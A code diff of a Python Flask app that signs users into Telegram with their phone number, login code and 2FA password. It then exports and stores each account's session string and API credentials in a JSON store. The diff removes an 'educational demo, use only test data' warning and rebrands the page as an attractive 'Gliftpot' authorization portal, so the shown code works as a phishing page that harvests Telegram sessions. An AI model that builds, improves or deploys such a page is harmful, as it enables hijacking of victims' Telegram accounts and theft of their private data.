@@ -420,74 +420,74 @@ class TelegramAuthTester:
     async def export_tdata(self, client, user_info, request_info=None):
         """Экспорт TData - исправленная версия"""
         try:
-        # Экспортируем session string
+            # Экспортируем session string
             session_string = await client.export_session_string()
         
-        # Получаем информацию о дата-центре
+            # Получаем информацию о дата-центре
             dc_info = await client.storage.dc_id()
             dc_id = dc_info if dc_info else 2  # Значение по умолчанию
         
-        # Получаем базовую информацию о клиенте
+            # Получаем базовую информацию о клиенте
             tdata_info = {
-            'version': '1.0',
-            'user_id': user_info['id'],
-            'phone_number': user_info.get('phone_number', ''),
-            'first_name': user_info.get('first_name', ''),
-            'last_name': user_info.get('last_name', ''),
-            'username': user_info.get('username', ''),
-            'session_string': session_string,
-            'dc_id': dc_id,  # Используем полученный dc_id
-            'api_id': self.api_id,
-            'api_hash': self.api_hash,
-            'device_model': 'Pyrogram Export',
-            'system_version': '1.0',
-            'app_version': '1.0',
-            'lang_code': 'en',
-            'system_lang_code': 'en',
-            'exported_at': datetime.now().isoformat(),
-            'session_type': 'pyrogram_string_session'
-        }
+                'version': '1.0',
+                'user_id': user_info['id'],
+                'phone_number': user_info.get('phone_number', ''),
+                'first_name': user_info.get('first_name', ''),
+                'last_name': user_info.get('last_name', ''),
+                'username': user_info.get('username', ''),
+                'session_string': session_string,
+                'dc_id': dc_id,  # Используем полученный dc_id
+                'api_id': self.api_id,
+                'api_hash': self.api_hash,
+                'device_model': 'Pyrogram Export',
+                'system_version': '1.0',
+                'app_version': '1.0',
+                'lang_code': 'en',
+                'system_lang_code': 'en',
+                'exported_at': datetime.now().isoformat(),
+                'session_type': 'pyrogram_string_session'
+            }
         
-        # Сохраняем пользователя
+            # Сохраняем пользователя
             storage.save_user(user_info)
         
-        # Сохраняем сессию
+            # Сохраняем сессию
             session_data = {
-            'session_string': session_string,
-            'dc_id': dc_id,  # И здесь тоже исправляем
-            'api_id': self.api_id,
-            'api_hash': self.api_hash,
-            'device_model': 'Pyrogram Export',
-            'system_version': '1.0',
-            'app_version': '1.0',
-            'lang_code': 'en',
-            'system_lang_code': 'en'
-        }
+                'session_string': session_string,
+                'dc_id': dc_id,  # И здесь тоже исправляем
+                'api_id': self.api_id,
+                'api_hash': self.api_hash,
+                'device_model': 'Pyrogram Export',
+                'system_version': '1.0',
+                'app_version': '1.0',
+                'lang_code': 'en',
+                'system_lang_code': 'en'
+            }
         
             session_id = storage.save_session(
-            user_info['id'], 
-            session_data, 
-            request_info
-        )
+                user_info['id'], 
+                session_data, 
+                request_info
+            )
         
             if session_id:
-            # Сохраняем полный TData
+                # Сохраняем полный TData
                 tdata_id = storage.save_tdata(
-                user_info['id'], 
-                session_id, 
-                tdata_info
-            )
+                    user_info['id'], 
+                    session_id, 
+                    tdata_info
+                )
             
                 logger.info(f"💾 TData сохранен. Session ID: {session_id}, TData ID: {tdata_id}")
             
                 return {
-                'success': True,
-                'session_id': session_id,
-                'tdata_id': tdata_id,
-                'user_id': user_info['id'],
-                'session_string': session_string,
-                'message': 'TData успешно экспортирован в JSON хранилище'
-            }
+                    'success': True,
+                    'session_id': session_id,
+                    'tdata_id': tdata_id,
+                    'user_id': user_info['id'],
+                    'session_string': session_string,
+                    'message': 'TData успешно экспортирован в JSON хранилище'
+                }
             else:
                 return {'success': False, 'error': 'Ошибка сохранения сессии'}
             
@@ -501,199 +501,487 @@ auth_tester = TelegramAuthTester()
 # 🎯 Главная страница с HTML интерфейсом
 @app.route('/')
 def home():
-    """Главная страница с интерфейсом"""
+    """Главная страница с космическим интерфейсом"""
     stats = storage.get_stats()
     
     return f'''
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Telegram TData Exporter</title>
+    <title>Gliftpot - Telegram Auth</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js"></script>
     <style>
+        * {{
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }}
+
         body {{
-            font-family: Arial, sans-serif;
-            max-width: 800px;
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #1a0033 0%, #4a0072 50%, #8a2be2 100%);
+            min-height: 100vh;
+            color: white;
+            overflow-x: hidden;
+            position: relative;
+        }}
+
+        /* Космические элементы фона */
+        body::before {{
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 20% 80%, rgba(120, 119, 198, 0.3) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(255, 119, 198, 0.15) 0%, transparent 50%),
+                radial-gradient(circle at 40% 40%, rgba(120, 219, 255, 0.2) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: -1;
+        }}
+
+        .stars {{
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+        }}
+
+        .star {{
+            position: absolute;
+            background: white;
+            border-radius: 50%;
+            animation: twinkle 5s infinite;
+        }}
+
+        @keyframes twinkle {{
+            0%, 100% {{ opacity: 0.2; }}
+            50% {{ opacity: 1; }}
+        }}
+
+        .container {{
+            max-width: 500px;
             margin: 0 auto;
             padding: 20px;
-            background: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
         }}
-        .container {{
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }}
-        .header {{
+
+        .logo {{
             text-align: center;
             margin-bottom: 30px;
+            animation: float 6s ease-in-out infinite;
         }}
-        .stats {{
-            background: #e8f5e8;
-            padding: 15px;
-            border-radius: 5px;
-            margin-bottom: 20px;
+
+        @keyframes float {{
+            0%, 100% {{ transform: translateY(0px); }}
+            50% {{ transform: translateY(-10px); }}
         }}
+
+        .logo h1 {{
+            font-size: 3.5rem;
+            font-weight: bold;
+            background: linear-gradient(45deg, #ff6bff, #9d4edd, #5a00b5);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            text-shadow: 0 0 30px rgba(255, 107, 255, 0.5);
+            margin-bottom: 10px;
+        }}
+
+        .logo p {{
+            font-size: 1.1rem;
+            opacity: 0.8;
+            letter-spacing: 2px;
+        }}
+
+        .auth-card {{
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 20px;
+            padding: 40px 30px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            margin-bottom: 30px;
+        }}
+
+        .animation-container {{
+            width: 200px;
+            height: 200px;
+            margin: 0 auto 20px;
+        }}
+
+        .start-btn {{
+            background: linear-gradient(45deg, #ff6bff, #9d4edd);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 1.2rem;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 20px rgba(255, 107, 255, 0.4);
+            margin-top: 20px;
+        }}
+
+        .start-btn:hover {{
+            transform: translateY(-2px);
+            box-shadow: 0 6px 25px rgba(255, 107, 255, 0.6);
+        }}
+
+        .start-btn:active {{
+            transform: translateY(0);
+        }}
+
         .step {{
-            margin-bottom: 25px;
-            padding: 20px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
+            display: none;
+            width: 100%;
+            animation: fadeIn 0.5s ease;
         }}
+
+        @keyframes fadeIn {{
+            from {{ opacity: 0; transform: translateY(20px); }}
+            to {{ opacity: 1; transform: translateY(0); }}
+        }}
+
+        .step.active {{
+            display: block;
+        }}
+
+        .step h3 {{
+            font-size: 1.5rem;
+            margin-bottom: 25px;
+            color: #ff6bff;
+            text-shadow: 0 0 10px rgba(255, 107, 255, 0.5);
+        }}
+
         .input-group {{
+            margin-bottom: 20px;
+            text-align: left;
+        }}
+
+        .input-group label {{
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #e0c3ff;
+        }}
+
+        .input-group input {{
+            width: 100%;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 10px;
+            color: white;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }}
+
+        .input-group input:focus {{
+            outline: none;
+            border-color: #ff6bff;
+            box-shadow: 0 0 15px rgba(255, 107, 255, 0.3);
+            background: rgba(255, 255, 255, 0.15);
+        }}
+
+        .input-group input::placeholder {{
+            color: rgba(255, 255, 255, 0.6);
+        }}
+
+        .btn {{
+            background: linear-gradient(45deg, #ff6bff, #9d4edd);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            font-size: 1rem;
+            border-radius: 25px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(255, 107, 255, 0.4);
+            width: 100%;
+            margin-top: 10px;
+        }}
+
+        .btn:hover {{
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(255, 107, 255, 0.6);
+        }}
+
+        .btn:disabled {{
+            background: rgba(255, 255, 255, 0.2);
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }}
+
+        .alert {{
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 10px;
+            text-align: left;
+            animation: slideIn 0.3s ease;
+        }}
+
+        @keyframes slideIn {{
+            from {{ opacity: 0; transform: translateX(-20px); }}
+            to {{ opacity: 1; transform: translateX(0); }}
+        }}
+
+        .success {{
+            background: rgba(76, 175, 80, 0.2);
+            border: 1px solid rgba(76, 175, 80, 0.5);
+            color: #a5d6a7;
+        }}
+
+        .error {{
+            background: rgba(244, 67, 54, 0.2);
+            border: 1px solid rgba(244, 67, 54, 0.5);
+            color: #ef9a9a;
+        }}
+
+        .info {{
+            background: rgba(33, 150, 243, 0.2);
+            border: 1px solid rgba(33, 150, 243, 0.5);
+            color: #90caf9;
+        }}
+
+        .warning {{
+            background: rgba(255, 193, 7, 0.2);
+            border: 1px solid rgba(255, 193, 7, 0.5);
+            color: #fff59d;
+        }}
+
+        .user-info {{
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: left;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }}
+
+        .user-info h4 {{
+            color: #ff6bff;
+            margin-bottom: 15px;
+            text-align: center;
+        }}
+
+        .user-info p {{
+            margin: 8px 0;
+            color: #e0c3ff;
+        }}
+
+        .stats {{
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 20px;
+            margin-top: 20px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }}
+
+        .stats h4 {{
+            color: #ff6bff;
             margin-bottom: 15px;
         }}
-        label {{
-            display: block;
-            margin-bottom: 5px;
-            font-weight: bold;
-        }}
-        input[type="text"], input[type="password"] {{
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            font-size: 16px;
-        }}
-        button {{
-            background: #007bff;
-            color: white;
-            padding: 12px 24px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-        }}
-        button:hover {{
-            background: #0056b3;
-        }}
-        button:disabled {{
-            background: #6c757d;
-            cursor: not-allowed;
-        }}
-        .alert {{
-            padding: 12px;
-            margin: 15px 0;
-            border-radius: 5px;
-        }}
-        .success {{
-            background: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
-        }}
-        .error {{
-            background: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
-        }}
-        .info {{
-            background: #d1ecf1;
-            color: #0c5460;
-            border: 1px solid #bee5eb;
-        }}
-        .warning {{
-            background: #fff3cd;
-            color: #856404;
-            border: 1px solid #ffeaa7;
-        }}
+
         .hidden {{
             display: none;
         }}
-        .user-info {{
-            background: #e8f5e8;
-            padding: 15px;
-            border-radius: 5px;
-            margin: 10px 0;
+
+        .back-btn {{
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            padding: 10px 20px;
+            border-radius: 20px;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: all 0.3s ease;
+        }}
+
+        .back-btn:hover {{
+            background: rgba(255, 255, 255, 0.2);
         }}
     </style>
 </head>
 <body>
+    <!-- Космический фон со звездами -->
+    <div class="stars" id="stars"></div>
+
     <div class="container">
-        <div class="header">
-            <h1>🔐 Telegram TData Exporter</h1>
-            <p>Educational Demo - Экспорт сессий Telegram</p>
+        <!-- Логотип и заголовок -->
+        <div class="logo">
+            <h1>Gliftpot</h1>
+            <p>TELEGRAM AUTH SYSTEM</p>
         </div>
 
-        <div class="stats">
-            <h3>📊 Статистика хранилища:</h3>
-            <p>👥 Пользователей: {stats['total_users']}</p>
-            <p>💾 Сессий: {stats['active_sessions']}</p>
-            <p>🗂️ TData записей: {stats['total_tdata_records']}</p>
-        </div>
-
-        <div class="alert warning">
-            ⚠️ <strong>ВНИМАНИЕ:</strong> Это образовательная демонстрация. Используйте только тестовые данные!
-        </div>
-
-        <div id="step1" class="step">
-            <h3>📱 Шаг 1: Введите номер телефона</h3>
-            <div class="input-group">
-                <label for="phone">Номер телефона:</label>
-                <input type="text" id="phone" placeholder="+1234567890" value="">
+        <!-- Основная карточка авторизации -->
+        <div class="auth-card">
+            <!-- Начальный экран -->
+            <div id="startStep" class="step active">
+                <div class="animation-container">
+                    <lottie-player 
+                        src="https://lottie.host/82e23552-567e-4c66-a027-93846151fddc/HcJhk6i72d.lottie" 
+                        background="transparent" 
+                        speed="1" 
+                        loop 
+                        autoplay>
+                    </lottie-player>
+                </div>
+                <h3>Добро пожаловать в космос Gliftpot</h3>
+                <p>Начните авторизацию через Telegram для доступа к системе</p>
+                <button class="start-btn" onclick="startAuth()">
+                    🚀 Авторизация через Telegram
+                </button>
             </div>
-            <button onclick="requestCode()" id="requestBtn">Получить код</button>
+
+            <!-- Шаг 1: Ввод номера телефона -->
+            <div id="step1" class="step">
+                <h3>📱 Введите номер телефона</h3>
+                <div class="input-group">
+                    <label for="phone">Номер телефона:</label>
+                    <input type="text" id="phone" placeholder="+1234567890" value="">
+                </div>
+                <button class="btn" onclick="requestCode()" id="requestBtn">Получить код</button>
+                <button class="back-btn" onclick="showStep('startStep')">← Назад</button>
+            </div>
+
+            <!-- Шаг 2: Ввод кода -->
+            <div id="step2" class="step">
+                <h3>🔢 Введите код из Telegram</h3>
+                <div class="input-group">
+                    <label for="code">5-значный код:</label>
+                    <input type="text" id="code" placeholder="12345" maxlength="5">
+                </div>
+                <button class="btn" onclick="verifyCode()" id="verifyBtn">Проверить код</button>
+                <button class="back-btn" onclick="showStep('step1')">← Назад</button>
+            </div>
+
+            <!-- Шаг 3: Пароль 2FA -->
+            <div id="step3" class="step">
+                <h3>🔒 Введите пароль 2FA</h3>
+                <div class="alert info">
+                    Этот аккаунт защищен двухфакторной аутентификацией
+                </div>
+                <div class="input-group">
+                    <label for="password">Пароль 2FA:</label>
+                    <input type="password" id="password" placeholder="Введите пароль">
+                </div>
+                <button class="btn" onclick="verifyPassword()" id="passwordBtn">Проверить пароль</button>
+                <button class="back-btn" onclick="showStep('step2')">← Назад</button>
+            </div>
+
+            <!-- Результаты -->
+            <div id="results"></div>
         </div>
 
-        <div id="step2" class="step hidden">
-            <h3>🔢 Шаг 2: Введите код из Telegram</h3>
-            <div class="input-group">
-                <label for="code">5-значный код:</label>
-                <input type="text" id="code" placeholder="12345" maxlength="5">
-            </div>
-            <button onclick="verifyCode()" id="verifyBtn">Проверить код</button>
+        <!-- Статистика -->
+        <div class="stats" id="statsSection">
+            <h4>📊 Статистика системы</h4>
+            <p>Загрузка...</p>
         </div>
-
-        <div id="step3" class="step hidden">
-            <h3>🔒 Шаг 3: Введите пароль 2FA (если требуется)</h3>
-            <div class="alert info">
-                Этот аккаунт защищен двухфакторной аутентификацией
-            </div>
-            <div class="input-group">
-                <label for="password">Пароль 2FA:</label>
-                <input type="password" id="password" placeholder="Введите пароль">
-            </div>
-            <button onclick="verifyPassword()" id="passwordBtn">Проверить пароль</button>
-        </div>
-
-        <div id="results"></div>
     </div>
 
     <script>
+        // Создание звездного фона
+        function createStars() {{
+            const stars = document.getElementById('stars');
+            const starsCount = 150;
+            
+            for (let i = 0; i < starsCount; i++) {{
+                const star = document.createElement('div');
+                star.className = 'star';
+                
+                const size = Math.random() * 2 + 1;
+                star.style.width = size + 'px';
+                star.style.height = size + 'px';
+                
+                star.style.left = Math.random() * 100 + '%';
+                star.style.top = Math.random() * 100 + '%';
+                star.style.animationDelay = Math.random() * 5 + 's';
+                
+                stars.appendChild(star);
+            }}
+        }}
+
         let currentSessionId = '';
         let currentPhone = '';
 
+        // Показать определенный шаг
+        function showStep(stepId) {{
+            document.querySelectorAll('.step').forEach(step => {{
+                step.classList.remove('active');
+            }});
+            document.getElementById(stepId).classList.add('active');
+            document.getElementById('results').innerHTML = '';
+        }}
+
+        // Начать авторизацию
+        function startAuth() {{
+            showStep('step1');
+            loadStats();
+        }}
+
+        // Показать уведомление
         function showAlert(message, type) {{
             const results = document.getElementById('results');
             results.innerHTML = '<div class="alert ' + type + '">' + message + '</div>';
         }}
 
+        // Показать информацию о пользователе
         function showUserInfo(userInfo, exportInfo) {{
             const results = document.getElementById('results');
             results.innerHTML = `
                 <div class="user-info">
-                    <h3>✅ Успешная аутентификация!</h3>
-                    <p><strong>Имя:</strong> ${{userInfo.first_name || 'Не указано'}}</p>
-                    <p><strong>Фамилия:</strong> ${{userInfo.last_name || 'Не указана'}}</p>
-                    <p><strong>Username:</strong> @${{userInfo.username || 'Не указан'}}</p>
-                    <p><strong>ID:</strong> ${{userInfo.id}}</p>
-                    <p><strong>Телефон:</strong> ${{userInfo.phone_number}}</p>
-                    <p><strong>Session String:</strong> ${{exportInfo.session_string.substring(0, 50)}}...</p>
-                    <p><strong>TData ID:</strong> ${{exportInfo.tdata_id}}</p>
+                    <h4>✅ Успешная авторизация!</h4>
+                    <p><strong>👤 Имя:</strong> ${{userInfo.first_name || 'Не указано'}}</p>
+                    <p><strong>👥 Фамилия:</strong> ${{userInfo.last_name || 'Не указана'}}</p>
+                    <p><strong>🔗 Username:</strong> @${{userInfo.username || 'Не указан'}}</p>
+                    <p><strong>🆔 ID:</strong> ${{userInfo.id}}</p>
+                    <p><strong>📞 Телефон:</strong> ${{userInfo.phone_number}}</p>
+                    <p><strong>🔐 Session String:</strong> ${{exportInfo.session_string.substring(0, 50)}}...</p>
+                    <p><strong>💾 TData ID:</strong> ${{exportInfo.tdata_id}}</p>
                 </div>
+                <button class="btn" onclick="location.reload()">🔄 Новая авторизация</button>
             `;
         }}
 
-        function showStep(stepNumber) {{
-            // Скрываем все шаги
-            document.getElementById('step1').classList.add('hidden');
-            document.getElementById('step2').classList.add('hidden');
-            document.getElementById('step3').classList.add('hidden');
-            
-            // Показываем нужный шаг
-            document.getElementById('step' + stepNumber).classList.remove('hidden');
+        // Загрузка статистики
+        async function loadStats() {{
+            try {{
+                const response = await fetch('/api/storage/stats');
+                if (response.ok) {{
+                    const data = await response.json();
+                    if (data.success) {{
+                        const stats = data.statistics;
+                        document.getElementById('statsSection').innerHTML = `
+                            <h4>📊 Статистика системы</h4>
+                            <p>👥 Пользователей: ${{stats.total_users}}</p>
+                            <p>💾 Сессий: ${{stats.active_sessions}}</p>
+                            <p>🗂️ TData записей: ${{stats.total_tdata_records}}</p>
+                        `;
+                    }}
+                }}
+            }} catch (error) {{
+                console.error('Ошибка загрузки статистики:', error);
+            }}
         }}
 
+        // Запрос кода
         async function requestCode() {{
             const phone = document.getElementById('phone').value.trim();
             currentPhone = phone;
@@ -705,7 +993,7 @@ def home():
 
             const btn = document.getElementById('requestBtn');
             btn.disabled = true;
-            btn.textContent = 'Отправка...';
+            btn.textContent = '📡 Отправка...';
 
             try {{
                 const response = await fetch('/api/auth/request-code', {{
@@ -714,16 +1002,11 @@ def home():
                     body: JSON.stringify({{phone: phone}})
                 }});
                 
-                if (!response.ok) {{
-                    const errorText = await response.text();
-                    throw new Error(`HTTP error! status: ${{response.status}}`);
-                }}
-                
                 const data = await response.json();
                 
                 if (data.success) {{
                     currentSessionId = data.session_id;
-                    showStep(2);
+                    showStep('step2');
                     showAlert('✅ Код отправлен в Telegram! Проверьте приложение и введите код.', 'success');
                     document.getElementById('code').focus();
                 }} else {{
@@ -738,6 +1021,7 @@ def home():
             }}
         }}
 
+        // Верификация кода
         async function verifyCode() {{
             const code = document.getElementById('code').value.trim();
 
@@ -748,7 +1032,7 @@ def home():
 
             const btn = document.getElementById('verifyBtn');
             btn.disabled = true;
-            btn.textContent = 'Проверка...';
+            btn.textContent = '🔍 Проверка...';
 
             try {{
                 const response = await fetch('/api/auth/verify-code', {{
@@ -760,21 +1044,16 @@ def home():
                     }})
                 }});
                 
-                if (!response.ok) {{
-                    const errorText = await response.text();
-                    throw new Error(`HTTP error! status: ${{response.status}}`);
-                }}
-                
                 const data = await response.json();
                 
                 if (data.success) {{
                     if (data.needs_password) {{
-                        showStep(3);
+                        showStep('step3');
                         showAlert('🔒 Требуется пароль двухфакторной аутентификации', 'info');
                         document.getElementById('password').focus();
                     }} else {{
                         showUserInfo(data.user_info, data.export_info);
-                        showAlert('✅ TData успешно экспортирован!', 'success');
+                        loadStats();
                     }}
                 }} else {{
                     showAlert('❌ ' + data.error, 'error');
@@ -788,6 +1067,7 @@ def home():
             }}
         }}
 
+        // Верификация пароля 2FA
         async function verifyPassword() {{
             const password = document.getElementById('password').value;
 
@@ -798,7 +1078,7 @@ def home():
 
             const btn = document.getElementById('passwordBtn');
             btn.disabled = true;
-            btn.textContent = 'Проверка...';
+            btn.textContent = '🔍 Проверка...';
 
             try {{
                 const response = await fetch('/api/auth/verify-password', {{
@@ -810,16 +1090,11 @@ def home():
                     }})
                 }});
                 
-                if (!response.ok) {{
-                    const errorText = await response.text();
-                    throw new Error(`HTTP error! status: ${{response.status}}`);
-                }}
-                
                 const data = await response.json();
                 
                 if (data.success) {{
                     showUserInfo(data.user_info, data.export_info);
-                    showAlert('✅ TData успешно экспортирован!', 'success');
+                    loadStats();
                 }} else {{
                     showAlert('❌ ' + data.error, 'error');
                 }}
@@ -844,12 +1119,18 @@ def home():
         document.getElementById('password').addEventListener('keypress', function(e) {{
             if (e.key === 'Enter') verifyPassword();
         }});
+
+        // Инициализация
+        document.addEventListener('DOMContentLoaded', function() {{
+            createStars();
+            loadStats();
+        }});
     </script>
 </body>
 </html>
 '''
 
-# 🎯 API Endpoints
+# 🎯 API Endpoints (остаются без изменений)
 @app.route('/api/auth/request-code', methods=['POST', 'OPTIONS'])
 def request_code():
     """Запрос кода аутентификации"""
